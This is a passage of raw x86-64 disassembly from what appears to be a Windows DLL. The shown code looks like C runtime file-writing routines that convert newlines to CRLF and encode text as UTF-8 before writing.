   18000cac4:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   18000cac9:	0f 94 c0             	sete   %al
   18000cacc:	ff c0                	inc    %eax
   18000cace:	44 8b c0             	mov    %eax,%r8d
   18000cad1:	44 8b f8             	mov    %eax,%r15d
   18000cad4:	e8 57 0c 00 00       	call   0x18000d730
   18000cad9:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000cadd:	0f 84 d7 00 00 00    	je     0x18000cbba
   18000cae3:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   18000cae7:	4c 8b 6d af          	mov    -0x51(%rbp),%r13
   18000caeb:	48 63 f0             	movslq %eax,%rsi
   18000caee:	48 03 f7             	add    %rdi,%rsi
   18000caf1:	e9 e6 00 00 00       	jmp    0x18000cbdc
   18000caf6:	0f b6 07             	movzbl (%rdi),%eax
   18000caf9:	49 8b d5             	mov    %r13,%rdx
   18000cafc:	48 2b d7             	sub    %rdi,%rdx
   18000caff:	4a 0f be b4 38 c0 a8 	movsbq 0x1a8c0(%rax,%r15,1),%rsi
   18000cb06:	01 00 
   18000cb08:	8d 4e 01             	lea    0x1(%rsi),%ecx
   18000cb0b:	48 63 c1             	movslq %ecx,%rax
   18000cb0e:	48 3b c2             	cmp    %rdx,%rax
   18000cb11:	0f 8f e4 01 00 00    	jg     0x18000ccfb
   18000cb17:	83 f9 04             	cmp    $0x4,%ecx
   18000cb1a:	4c 89 5d cf          	mov    %r11,-0x31(%rbp)
   18000cb1e:	41 8b c3             	mov    %r11d,%eax
   18000cb21:	48 89 7d d7          	mov    %rdi,-0x29(%rbp)
   18000cb25:	0f 94 c0             	sete   %al
   18000cb28:	4c 8d 4d cf          	lea    -0x31(%rbp),%r9
   18000cb2c:	ff c0                	inc    %eax
   18000cb2e:	48 8d 55 d7          	lea    -0x29(%rbp),%rdx
   18000cb32:	44 8b c0             	mov    %eax,%r8d
   18000cb35:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   18000cb3a:	8b d8                	mov    %eax,%ebx
   18000cb3c:	e8 ef 0b 00 00       	call   0x18000d730
   18000cb41:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000cb45:	74 73                	je     0x18000cbba
   18000cb47:	48 03 f7             	add    %rdi,%rsi
   18000cb4a:	44 8b fb             	mov    %ebx,%r15d
   18000cb4d:	e9 8a 00 00 00       	jmp    0x18000cbdc
   18000cb52:	48 8d 05 a7 34 ff ff 	lea    -0xcb59(%rip),%rax        # 0x180000000
   18000cb59:	4a 8b 94 e0 30 b8 01 	mov    0x1b830(%rax,%r12,8),%rdx
   18000cb60:	00 
   18000cb61:	42 8a 4c f2 3d       	mov    0x3d(%rdx,%r14,8),%cl
   18000cb66:	f6 c1 04             	test   $0x4,%cl
   18000cb69:	74 1b                	je     0x18000cb86
   18000cb6b:	42 8a 44 f2 3e       	mov    0x3e(%rdx,%r14,8),%al
   18000cb70:	80 e1 fb             	and    $0xfb,%cl
   18000cb73:	88 45 07             	mov    %al,0x7(%rbp)
   18000cb76:	8a 07                	mov    (%rdi),%al
   18000cb78:	42 88 4c f2 3d       	mov    %cl,0x3d(%rdx,%r14,8)
   18000cb7d:	48 8d 55 07          	lea    0x7(%rbp),%rdx
   18000cb81:	88 45 08             	mov    %al,0x8(%rbp)
   18000cb84:	eb 1f                	jmp    0x18000cba5
   18000cb86:	e8 b1 e4 ff ff       	call   0x18000b03c
   18000cb8b:	0f b6 0f             	movzbl (%rdi),%ecx
   18000cb8e:	33 d2                	xor    %edx,%edx
   18000cb90:	66 39 14 48          	cmp    %dx,(%rax,%rcx,2)
   18000cb94:	7d 2d                	jge    0x18000cbc3
   18000cb96:	48 ff c6             	inc    %rsi
   18000cb99:	49 3b f5             	cmp    %r13,%rsi
   18000cb9c:	0f 83 b2 01 00 00    	jae    0x18000cd54
   18000cba2:	48 8b d7             	mov    %rdi,%rdx
   18000cba5:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   18000cbab:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   18000cbb0:	e8 43 e3 ff ff       	call   0x18000aef8
   18000cbb5:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000cbb8:	75 22                	jne    0x18000cbdc
   18000cbba:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   18000cbbe:	e9 8b 01 00 00       	jmp    0x18000cd4e
   18000cbc3:	4d 8b c7             	mov    %r15,%r8
   18000cbc6:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   18000cbcb:	48 8b d7             	mov    %rdi,%rdx
   18000cbce:	e8 25 e3 ff ff       	call   0x18000aef8
   18000cbd3:	83 f8 ff             	cmp    $0xffffffff,%eax
   18000cbd6:	0f 84 af 01 00 00    	je     0x18000cd8b
   18000cbdc:	8b 4d a7             	mov    -0x59(%rbp),%ecx
   18000cbdf:	48 8d 45 0f          	lea    0xf(%rbp),%rax
   18000cbe3:	33 db                	xor    %ebx,%ebx
   18000cbe5:	4c 8d 44 24 48       	lea    0x48(%rsp),%r8
   18000cbea:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   18000cbef:	48 8d 7e 01          	lea    0x1(%rsi),%rdi
   18000cbf3:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   18000cbf8:	45 8b cf             	mov    %r15d,%r9d
   18000cbfb:	c7 44 24 28 05 00 00 	movl   $0x5,0x28(%rsp)
   18000cc02:	00 
   18000cc03:	33 d2                	xor    %edx,%edx
   18000cc05:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000cc0a:	e8 2d ce ff ff       	call   0x180009a3c
   18000cc0f:	8b f0                	mov    %eax,%esi
   18000cc11:	85 c0                	test   %eax,%eax
   18000cc13:	0f 84 d2 01 00 00    	je     0x18000cdeb
   18000cc19:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   18000cc1d:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   18000cc22:	44 8b c0             	mov    %eax,%r8d
   18000cc25:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   18000cc2a:	48 8d 55 0f          	lea    0xf(%rbp),%rdx
   18000cc2e:	ff 15 d4 35 00 00    	call   *0x35d4(%rip)        # 0x180010208
   18000cc34:	45 33 db             	xor    %r11d,%r11d
   18000cc37:	85 c0                	test   %eax,%eax
   18000cc39:	0f 84 a3 01 00 00    	je     0x18000cde2
   18000cc3f:	44 8b 7c 24 40       	mov    0x40(%rsp),%r15d
   18000cc44:	8b df                	mov    %edi,%ebx
   18000cc46:	2b 5d df             	sub    -0x21(%rbp),%ebx
   18000cc49:	41 03 df             	add    %r15d,%ebx
   18000cc4c:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   18000cc4f:	39 74 24 4c          	cmp    %esi,0x4c(%rsp)
   18000cc53:	0f 82 f1 00 00 00    	jb     0x18000cd4a
   18000cc59:	80 7c 24 44 0a       	cmpb   $0xa,0x44(%rsp)
   18000cc5e:	75 49                	jne    0x18000cca9
   18000cc60:	48 8b 4d b7          	mov    -0x49(%rbp),%rcx
   18000cc64:	41 8d 43 0d          	lea    0xd(%r11),%eax
   18000cc68:	4c 8d 4c 24 4c       	lea    0x4c(%rsp),%r9
   18000cc6d:	66 89 44 24 44       	mov    %ax,0x44(%rsp)
   18000cc72:	45 8d 43 01          	lea    0x1(%r11),%r8d
   18000cc76:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   18000cc7b:	48 8d 54 24 44       	lea    0x44(%rsp),%rdx
   18000cc80:	ff 15 82 35 00 00    	call   *0x3582(%rip)        # 0x180010208
   18000cc86:	45 33 db             	xor    %r11d,%r11d
   18000cc89:	85 c0                	test   %eax,%eax
   18000cc8b:	0f 84 f1 00 00 00    	je     0x18000cd82
   18000cc91:	83 7c 24 4c 01       	cmpl   $0x1,0x4c(%rsp)
   18000cc96:	0f 82 ae 00 00 00    	jb     0x18000cd4a
   18000cc9c:	41 ff c7             	inc    %r15d
   18000cc9f:	ff c3                	inc    %ebx
   18000cca1:	44 89 7c 24 40       	mov    %r15d,0x40(%rsp)
   18000cca6:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   18000cca9:	48 8b f7             	mov    %rdi,%rsi
   18000ccac:	49 3b fd             	cmp    %r13,%rdi
   18000ccaf:	0f 83 e0 00 00 00    	jae    0x18000cd95
   18000ccb5:	48 8b 45 e7          	mov    -0x19(%rbp),%rax
   18000ccb9:	8b 55 ab             	mov    -0x55(%rbp),%edx
   18000ccbc:	e9 04 fd ff ff       	jmp    0x18000c9c5
   18000ccc1:	41 8b d3             	mov    %r11d,%edx
   18000ccc4:	4d 85 c0             	test   %r8,%r8
   18000ccc7:	7e 2d                	jle    0x18000ccf6
   18000ccc9:	48 2b fe             	sub    %rsi,%rdi
   18000cccc:	48 8d 1d 2d 33 ff ff 	lea    -0xccd3(%rip),%rbx        # 0x180000000
   18000ccd3:	8a 04 37             	mov    (%rdi,%rsi,1),%al
   18000ccd6:	ff c2                	inc    %edx
   18000ccd8:	4a 8b 8c e3 30 b8 01 	mov    0x1b830(%rbx,%r12,8),%rcx
   18000ccdf:	00 
   18000cce0:	48 03 ce             	add    %rsi,%rcx
   18000cce3:	48 ff c6             	inc    %rsi
   18000cce6:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   18000cceb:	48 63 c2             	movslq %edx,%rax
   18000ccee:	49 3b c0             	cmp    %r8,%rax
   18000ccf1:	7c e0                	jl     0x18000ccd3
   18000ccf3:	8b 5d 9b             	mov    -0x65(%rbp),%ebx
   18000ccf6:	41 03 d8             	add    %r8d,%ebx
   18000ccf9:	eb 4c                	jmp    0x18000cd47
   18000ccfb:	45 8b cb             	mov    %r11d,%r9d
   18000ccfe:	48 85 d2             	test   %rdx,%rdx
   18000cd01:	7e 42                	jle    0x18000cd45
   18000cd03:	4c 8b 6d ef          	mov    -0x11(%rbp),%r13
   18000cd07:	4d 8b c3             	mov    %r11,%r8
   18000cd0a:	4d 8b d5             	mov    %r13,%r10
   18000cd0d:	41 83 e5 3f          	and    $0x3f,%r13d
   18000cd11:	49 c1 fa 06          	sar    $0x6,%r10
   18000cd15:	4e 8d 1c ed 00 00 00 	lea    0x0(,%r13,8),%r11
   18000cd1c:	00 
   18000cd1d:	4d 03 dd             	add    %r13,%r11
   18000cd20:	41 8a 04 38          	mov    (%r8,%rdi,1),%al
   18000cd24:	41 ff c1             	inc    %r9d
   18000cd27:	4b 8b 8c d7 30 b8 01 	mov    0x1b830(%r15,%r10,8),%rcx
   18000cd2e:	00 
   18000cd2f:	49 03 c8             	add    %r8,%rcx
   18000cd32:	49 ff c0             	inc    %r8
   18000cd35:	42 88 44 d9 3e       	mov    %al,0x3e(%rcx,%r11,8)
   18000cd3a:	49 63 c1             	movslq %r9d,%rax
   18000cd3d:	48 3b c2             	cmp    %rdx,%rax
   18000cd40:	7c de                	jl     0x18000cd20
   18000cd42:	45 33 db             	xor    %r11d,%r11d
   18000cd45:	03 da                	add    %edx,%ebx
   18000cd47:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   18000cd4a:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   18000cd4e:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   18000cd52:	eb 49                	jmp    0x18000cd9d
   18000cd54:	8a 07                	mov    (%rdi),%al
   18000cd56:	4c 8d 05 a3 32 ff ff 	lea    -0xcd5d(%rip),%r8        # 0x180000000
   18000cd5d:	4b 8b 8c e0 30 b8 01 	mov    0x1b830(%r8,%r12,8),%rcx
   18000cd64:	00 
   18000cd65:	ff c3                	inc    %ebx
   18000cd67:	89 5d 9b             	mov    %ebx,-0x65(%rbp)
   18000cd6a:	42 88 44 f1 3e       	mov    %al,0x3e(%rcx,%r14,8)
   18000cd6f:	4b 8b 84 e0 30 b8 01 	mov    0x1b830(%r8,%r12,8),%rax
   18000cd76:	00 
   18000cd77:	42 80 4c f0 3d 04    	orb    $0x4,0x3d(%rax,%r14,8)
   18000cd7d:	38 55 8f             	cmp    %dl,-0x71(%rbp)
   18000cd80:	eb cc                	jmp    0x18000cd4e
   18000cd82:	ff 15 38 33 00 00    	call   *0x3338(%rip)        # 0x1800100c0
   18000cd88:	89 45 97             	mov    %eax,-0x69(%rbp)
   18000cd8b:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   18000cd8f:	80 7d 8f 00          	cmpb   $0x0,-0x71(%rbp)
   18000cd93:	eb 08                	jmp    0x18000cd9d
   18000cd95:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   18000cd99:	44 38 5d 8f          	cmp    %r11b,-0x71(%rbp)
   18000cd9d:	74 0c                	je     0x18000cdab
   18000cd9f:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   18000cda4:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   18000cdab:	48 8b 45 f7          	mov    -0x9(%rbp),%rax
   18000cdaf:	f2 0f 10 45 97       	movsd  -0x69(%rbp),%xmm0
   18000cdb4:	f2 0f 11 00          	movsd  %xmm0,(%rax)
   18000cdb8:	89 48 08             	mov    %ecx,0x8(%rax)
   18000cdbb:	48 8b 4d 17          	mov    0x17(%rbp),%rcx
   18000cdbf:	48 33 cc             	xor    %rsp,%rcx
   18000cdc2:	e8 f9 4c ff ff       	call   0x180001ac0
   18000cdc7:	48 8b 9c 24 40 01 00 	mov    0x140(%rsp),%rbx
   18000cdce:	00 
   18000cdcf:	48 81 c4 00 01 00 00 	add    $0x100,%rsp
   18000cdd6:	41 5f                	pop    %r15
   18000cdd8:	41 5e                	pop    %r14
   18000cdda:	41 5d                	pop    %r13
   18000cddc:	41 5c                	pop    %r12
   18000cdde:	5f                   	pop    %rdi
   18000cddf:	5e                   	pop    %rsi
   18000cde0:	5d                   	pop    %rbp
   18000cde1:	c3                   	ret
   18000cde2:	ff 15 d8 32 00 00    	call   *0x32d8(%rip)        # 0x1800100c0
   18000cde8:	89 45 97             	mov    %eax,-0x69(%rbp)
   18000cdeb:	8b 4c 24 40          	mov    0x40(%rsp),%ecx
   18000cdef:	38 5d 8f             	cmp    %bl,-0x71(%rbp)
   18000cdf2:	eb a9                	jmp    0x18000cd9d
   18000cdf4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000cdf9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000cdfe:	56                   	push   %rsi
   18000cdff:	57                   	push   %rdi
   18000ce00:	41 56                	push   %r14
   18000ce02:	b8 50 14 00 00       	mov    $0x1450,%eax
   18000ce07:	e8 64 24 00 00       	call   0x18000f270
   18000ce0c:	48 2b e0             	sub    %rax,%rsp
   18000ce0f:	48 8b 05 fa d1 00 00 	mov    0xd1fa(%rip),%rax        # 0x18001a010
   18000ce16:	48 33 c4             	xor    %rsp,%rax
   18000ce19:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   18000ce20:	00 
   18000ce21:	4c 63 d2             	movslq %edx,%r10
   18000ce24:	48 8b f9             	mov    %rcx,%rdi
   18000ce27:	49 8b c2             	mov    %r10,%rax
   18000ce2a:	41 8b e9             	mov    %r9d,%ebp
   18000ce2d:	48 c1 f8 06          	sar    $0x6,%rax
   18000ce31:	48 8d 0d f8 e9 00 00 	lea    0xe9f8(%rip),%rcx        # 0x18001b830
   18000ce38:	41 83 e2 3f          	and    $0x3f,%r10d
   18000ce3c:	49 03 e8             	add    %r8,%rbp
   18000ce3f:	49 8b f0             	mov    %r8,%rsi
   18000ce42:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   18000ce46:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   18000ce4a:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   18000ce4f:	33 c0                	xor    %eax,%eax
   18000ce51:	48 89 07             	mov    %rax,(%rdi)
   18000ce54:	89 47 08             	mov    %eax,0x8(%rdi)
   18000ce57:	4c 3b c5             	cmp    %rbp,%r8
   18000ce5a:	73 6f                	jae    0x18000cecb
   18000ce5c:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   18000ce61:	48 3b f5             	cmp    %rbp,%rsi
   18000ce64:	73 24                	jae    0x18000ce8a
   18000ce66:	8a 06                	mov    (%rsi),%al
   18000ce68:	48 ff c6             	inc    %rsi
   18000ce6b:	3c 0a                	cmp    $0xa,%al
   18000ce6d:	75 09                	jne    0x18000ce78
   18000ce6f:	ff 47 08             	incl   0x8(%rdi)
   18000ce72:	c6 03 0d             	movb   $0xd,(%rbx)
   18000ce75:	48 ff c3             	inc    %rbx
   18000ce78:	88 03                	mov    %al,(%rbx)
   18000ce7a:	48 ff c3             	inc    %rbx
   18000ce7d:	48 8d 84 24 3f 14 00 	lea    0x143f(%rsp),%rax
   18000ce84:	00 
   18000ce85:	48 3b d8             	cmp    %rax,%rbx
   18000ce88:	72 d7                	jb     0x18000ce61
   18000ce8a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000ce90:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   18000ce95:	2b d8                	sub    %eax,%ebx
   18000ce97:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   18000ce9c:	44 8b c3             	mov    %ebx,%r8d
   18000ce9f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000cea4:	49 8b ce             	mov    %r14,%rcx
   18000cea7:	ff 15 5b 33 00 00    	call   *0x335b(%rip)        # 0x180010208
   18000cead:	85 c0                	test   %eax,%eax
   18000ceaf:	74 12                	je     0x18000cec3
   18000ceb1:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000ceb5:	01 47 04             	add    %eax,0x4(%rdi)
   18000ceb8:	3b c3                	cmp    %ebx,%eax
   18000ceba:	72 0f                	jb     0x18000cecb
   18000cebc:	48 3b f5             	cmp    %rbp,%rsi
   18000cebf:	72 9b                	jb     0x18000ce5c
   18000cec1:	eb 08                	jmp    0x18000cecb
   18000cec3:	ff 15 f7 31 00 00    	call   *0x31f7(%rip)        # 0x1800100c0
   18000cec9:	89 07                	mov    %eax,(%rdi)
   18000cecb:	48 8b c7             	mov    %rdi,%rax
   18000cece:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   18000ced5:	00 
   18000ced6:	48 33 cc             	xor    %rsp,%rcx
   18000ced9:	e8 e2 4b ff ff       	call   0x180001ac0
   18000cede:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   18000cee5:	00 
   18000cee6:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   18000ceea:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   18000ceee:	49 8b e3             	mov    %r11,%rsp
   18000cef1:	41 5e                	pop    %r14
   18000cef3:	5f                   	pop    %rdi
   18000cef4:	5e                   	pop    %rsi
   18000cef5:	c3                   	ret
   18000cef6:	cc                   	int3
   18000cef7:	cc                   	int3
   18000cef8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000cefd:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000cf02:	56                   	push   %rsi
   18000cf03:	57                   	push   %rdi
   18000cf04:	41 56                	push   %r14
   18000cf06:	b8 50 14 00 00       	mov    $0x1450,%eax
   18000cf0b:	e8 60 23 00 00       	call   0x18000f270
   18000cf10:	48 2b e0             	sub    %rax,%rsp
   18000cf13:	48 8b 05 f6 d0 00 00 	mov    0xd0f6(%rip),%rax        # 0x18001a010
   18000cf1a:	48 33 c4             	xor    %rsp,%rax
   18000cf1d:	48 89 84 24 40 14 00 	mov    %rax,0x1440(%rsp)
   18000cf24:	00 
   18000cf25:	4c 63 d2             	movslq %edx,%r10
   18000cf28:	48 8b f9             	mov    %rcx,%rdi
   18000cf2b:	49 8b c2             	mov    %r10,%rax
   18000cf2e:	41 8b e9             	mov    %r9d,%ebp
   18000cf31:	48 c1 f8 06          	sar    $0x6,%rax
   18000cf35:	48 8d 0d f4 e8 00 00 	lea    0xe8f4(%rip),%rcx        # 0x18001b830
   18000cf3c:	41 83 e2 3f          	and    $0x3f,%r10d
   18000cf40:	49 03 e8             	add    %r8,%rbp
   18000cf43:	49 8b f0             	mov    %r8,%rsi
   18000cf46:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   18000cf4a:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   18000cf4e:	4c 8b 74 d0 28       	mov    0x28(%rax,%rdx,8),%r14
   18000cf53:	33 c0                	xor    %eax,%eax
   18000cf55:	48 89 07             	mov    %rax,(%rdi)
   18000cf58:	89 47 08             	mov    %eax,0x8(%rdi)
   18000cf5b:	4c 3b c5             	cmp    %rbp,%r8
   18000cf5e:	0f 83 82 00 00 00    	jae    0x18000cfe6
   18000cf64:	48 8d 5c 24 40       	lea    0x40(%rsp),%rbx
   18000cf69:	48 3b f5             	cmp    %rbp,%rsi
   18000cf6c:	73 31                	jae    0x18000cf9f
   18000cf6e:	0f b7 06             	movzwl (%rsi),%eax
   18000cf71:	48 83 c6 02          	add    $0x2,%rsi
   18000cf75:	66 83 f8 0a          	cmp    $0xa,%ax
   18000cf79:	75 10                	jne    0x18000cf8b
   18000cf7b:	83 47 08 02          	addl   $0x2,0x8(%rdi)
   18000cf7f:	b9 0d 00 00 00       	mov    $0xd,%ecx
   18000cf84:	66 89 0b             	mov    %cx,(%rbx)
   18000cf87:	48 83 c3 02          	add    $0x2,%rbx
   18000cf8b:	66 89 03             	mov    %ax,(%rbx)
   18000cf8e:	48 83 c3 02          	add    $0x2,%rbx
   18000cf92:	48 8d 84 24 3e 14 00 	lea    0x143e(%rsp),%rax
   18000cf99:	00 
   18000cf9a:	48 3b d8             	cmp    %rax,%rbx
   18000cf9d:	72 ca                	jb     0x18000cf69
   18000cf9f:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000cfa5:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   18000cfaa:	48 2b d8             	sub    %rax,%rbx
   18000cfad:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   18000cfb2:	48 d1 fb             	sar    $1,%rbx
   18000cfb5:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   18000cfba:	03 db                	add    %ebx,%ebx
   18000cfbc:	49 8b ce             	mov    %r14,%rcx
   18000cfbf:	44 8b c3             	mov    %ebx,%r8d
   18000cfc2:	ff 15 40 32 00 00    	call   *0x3240(%rip)        # 0x180010208
   18000cfc8:	85 c0                	test   %eax,%eax
   18000cfca:	74 12                	je     0x18000cfde
   18000cfcc:	8b 44 24 30          	mov    0x30(%rsp),%eax
   18000cfd0:	01 47 04             	add    %eax,0x4(%rdi)
   18000cfd3:	3b c3                	cmp    %ebx,%eax
   18000cfd5:	72 0f                	jb     0x18000cfe6
   18000cfd7:	48 3b f5             	cmp    %rbp,%rsi
   18000cfda:	72 88                	jb     0x18000cf64
   18000cfdc:	eb 08                	jmp    0x18000cfe6
   18000cfde:	ff 15 dc 30 00 00    	call   *0x30dc(%rip)        # 0x1800100c0
   18000cfe4:	89 07                	mov    %eax,(%rdi)
   18000cfe6:	48 8b c7             	mov    %rdi,%rax
   18000cfe9:	48 8b 8c 24 40 14 00 	mov    0x1440(%rsp),%rcx
   18000cff0:	00 
   18000cff1:	48 33 cc             	xor    %rsp,%rcx
   18000cff4:	e8 c7 4a ff ff       	call   0x180001ac0
   18000cff9:	4c 8d 9c 24 50 14 00 	lea    0x1450(%rsp),%r11
   18000d000:	00 
   18000d001:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   18000d005:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   18000d009:	49 8b e3             	mov    %r11,%rsp
   18000d00c:	41 5e                	pop    %r14
   18000d00e:	5f                   	pop    %rdi
   18000d00f:	5e                   	pop    %rsi
   18000d010:	c3                   	ret
   18000d011:	cc                   	int3
   18000d012:	cc                   	int3
   18000d013:	cc                   	int3
   18000d014:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000d019:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   18000d01e:	56                   	push   %rsi
   18000d01f:	57                   	push   %rdi
   18000d020:	41 54                	push   %r12
   18000d022:	41 56                	push   %r14
   18000d024:	41 57                	push   %r15
   18000d026:	b8 70 14 00 00       	mov    $0x1470,%eax
   18000d02b:	e8 40 22 00 00       	call   0x18000f270
   18000d030:	48 2b e0             	sub    %rax,%rsp
   18000d033:	48 8b 05 d6 cf 00 00 	mov    0xcfd6(%rip),%rax        # 0x18001a010
   18000d03a:	48 33 c4             	xor    %rsp,%rax
   18000d03d:	48 89 84 24 60 14 00 	mov    %rax,0x1460(%rsp)
   18000d044:	00 
   18000d045:	4c 63 d2             	movslq %edx,%r10
   18000d048:	48 8b d9             	mov    %rcx,%rbx
   18000d04b:	49 8b c2             	mov    %r10,%rax
   18000d04e:	45 8b f1             	mov    %r9d,%r14d
   18000d051:	48 c1 f8 06          	sar    $0x6,%rax
   18000d055:	48 8d 0d d4 e7 00 00 	lea    0xe7d4(%rip),%rcx        # 0x18001b830
   18000d05c:	41 83 e2 3f          	and    $0x3f,%r10d
   18000d060:	4d 03 f0             	add    %r8,%r14
   18000d063:	4d 8b f8             	mov    %r8,%r15
   18000d066:	49 8b f8             	mov    %r8,%rdi
   18000d069:	48 8b 04 c1          	mov    (%rcx,%rax,8),%rax
   18000d06d:	4b 8d 14 d2          	lea    (%r10,%r10,8),%rdx
   18000d071:	4c 8b 64 d0 28       	mov    0x28(%rax,%rdx,8),%r12
   18000d076:	33 c0                	xor    %eax,%eax
   18000d078:	48 89 03             	mov    %rax,(%rbx)
   18000d07b:	4d 3b c6             	cmp    %r14,%r8
   18000d07e:	89 43 08             	mov    %eax,0x8(%rbx)
   18000d081:	0f 83 ce 00 00 00    	jae    0x18000d155
   18000d087:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   18000d08c:	49 3b fe             	cmp    %r14,%rdi
   18000d08f:	73 2d                	jae    0x18000d0be
   18000d091:	0f b7 0f             	movzwl (%rdi),%ecx
   18000d094:	48 83 c7 02          	add    $0x2,%rdi
   18000d098:	66 83 f9 0a          	cmp    $0xa,%cx
   18000d09c:	75 0c                	jne    0x18000d0aa
   18000d09e:	ba 0d 00 00 00       	mov    $0xd,%edx
   18000d0a3:	66 89 10             	mov    %dx,(%rax)
   18000d0a6:	48 83 c0 02          	add    $0x2,%rax
   18000d0aa:	66 89 08             	mov    %cx,(%rax)
   18000d0ad:	48 83 c0 02          	add    $0x2,%rax
   18000d0b1:	48 8d 8c 24 f8 06 00 	lea    0x6f8(%rsp),%rcx
   18000d0b8:	00 
   18000d0b9:	48 3b c1             	cmp    %rcx,%rax
   18000d0bc:	72 ce                	jb     0x18000d08c
   18000d0be:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   18000d0c4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   18000d0c9:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   18000d0cf:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   18000d0d4:	48 2b c1             	sub    %rcx,%rax
   18000d0d7:	c7 44 24 28 55 0d 00 	movl   $0xd55,0x28(%rsp)
   18000d0de:	00 
   18000d0df:	48 8d 8c 24 00 07 00 	lea    0x700(%rsp),%rcx
   18000d0e6:	00 
   18000d0e7:	48 d1 f8             	sar    $1,%rax
   18000d0ea:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   18000d0ef:	44 8b c8             	mov    %eax,%r9d
   18000d0f2:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   18000d0f7:	33 d2                	xor    %edx,%edx
   18000d0f9:	e8 3e c9 ff ff       	call   0x180009a3c
   18000d0fe:	8b e8                	mov    %eax,%ebp
   18000d100:	85 c0                	test   %eax,%eax
   18000d102:	74 49                	je     0x18000d14d
   18000d104:	33 f6                	xor    %esi,%esi
   18000d106:	85 c0                	test   %eax,%eax
   18000d108:	74 33                	je     0x18000d13d
   18000d10a:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   18000d110:	48 8d 94 24 00 07 00 	lea    0x700(%rsp),%rdx
   18000d117:	00 
   18000d118:	8b ce                	mov    %esi,%ecx
   18000d11a:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   18000d11f:	44 8b c5             	mov    %ebp,%r8d
   18000d122:	48 03 d1             	add    %rcx,%rdx
   18000d125:	49 8b cc             	mov    %r12,%rcx
   18000d128:	44 2b c6             	sub    %esi,%r8d
   18000d12b:	ff 15 d7 30 00 00    	call   *0x30d7(%rip)        # 0x180010208
   18000d131:	85 c0                	test   %eax,%eax
   18000d133:	74 18                	je     0x18000d14d
   18000d135:	03 74 24 40          	add    0x40(%rsp),%esi
   18000d139:	3b f5                	cmp    %ebp,%esi
   18000d13b:	72 cd                	jb     0x18000d10a
   18000d13d:	8b c7                	mov    %edi,%eax
   18000d13f:	41 2b c7             	sub    %r15d,%eax
   18000d142:	89 43 04             	mov    %eax,0x4(%rbx)
   18000d145:	49 3b fe             	cmp    %r14,%rdi
   18000d148:	e9 34 ff ff ff       	jmp    0x18000d081
   18000d14d:	ff 15 6d 2f 00 00    	call   *0x2f6d(%rip)        # 0x1800100c0
   18000d153:	89 03                	mov    %eax,(%rbx)
   18000d155:	48 8b c3             	mov    %rbx,%rax
   18000d158:	48 8b 8c 24 60 14 00 	mov    0x1460(%rsp),%rcx
   18000d15f:	00 
   18000d160:	48 33 cc             	xor    %rsp,%rcx
   18000d163:	e8 58 49 ff ff       	call   0x180001ac0
   18000d168:	4c 8d 9c 24 70 14 00 	lea    0x1470(%rsp),%r11
   18000d16f:	00 
   18000d170:	49 8b 5b 30          	mov    0x30(%r11),%rbx
